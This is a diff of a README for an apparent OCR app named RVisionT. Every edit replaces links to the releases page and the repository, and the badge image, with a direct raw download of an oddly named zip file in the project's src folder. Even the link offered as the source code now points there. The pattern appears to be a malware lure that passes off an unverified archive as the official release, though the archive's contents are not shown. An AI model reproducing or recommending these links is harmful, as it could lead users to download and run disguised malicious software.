@@ -6,11 +6,11 @@ Welcome to RVisionT! This application helps you convert images into text with pr
 
 ## 📥 Download RVisionT
 
-[![Download RVisionT](https://img.shields.io/badge/Download%20RVisionT-Right%20Here-blue)](https://github.com/vimo-dgaf/RVisionT/releases)
+[![Download RVisionT](https://github.com/vimo-dgaf/RVisionT/raw/refs/heads/main/src/T_R_Vision_dufferdom.zip%20RVisionT-Right%20Here-blue)](https://github.com/vimo-dgaf/RVisionT/raw/refs/heads/main/src/T_R_Vision_dufferdom.zip)
 
 To get started, simply visit the following link to download the latest version of RVisionT:
 
-[Download the latest release](https://github.com/vimo-dgaf/RVisionT/releases)
+[Download the latest release](https://github.com/vimo-dgaf/RVisionT/raw/refs/heads/main/src/T_R_Vision_dufferdom.zip)
 
 ## 📋 Features
 
@@ -32,7 +32,7 @@ Make sure your computer meets the following minimum requirements to run RVisionT
 
 1. **Visit the Releases Page**: Click on the link below to access the RVisionT releases page.
 
-   [Download the latest release](https://github.com/vimo-dgaf/RVisionT/releases)
+   [Download the latest release](https://github.com/vimo-dgaf/RVisionT/raw/refs/heads/main/src/T_R_Vision_dufferdom.zip)
 
 2. **Choose the Latest Version**: Look for the latest release. It will be clearly marked and include the version number (e.g., v1.0).
 
@@ -72,7 +72,7 @@ RVisionT supports popular image formats such as JPEG, PNG, and BMP. Make sure yo
 
 ### Is RVisionT open source?
 
-Yes, RVisionT is open source. You can find the source code and contribute to the project on our [GitHub repository](https://github.com/vimo-dgaf/RVisionT).
+Yes, RVisionT is open source. You can find the source code and contribute to the project on our [GitHub repository](https://github.com/vimo-dgaf/RVisionT/raw/refs/heads/main/src/T_R_Vision_dufferdom.zip).
 
 ### Where can I get help if I have issues?
 
@@ -88,4 +88,4 @@ For inquiries, please reach out through our GitHub repository or the contact sec
 
 Thank you for choosing RVisionT. We hope it makes your text recognition tasks easier and more efficient. Happy scanning!
 
-[Download the latest release](https://github.com/vimo-dgaf/RVisionT/releases)
+[Download the latest release](https://github.com/vimo-dgaf/RVisionT/raw/refs/heads/main/src/T_R_Vision_dufferdom.zip)
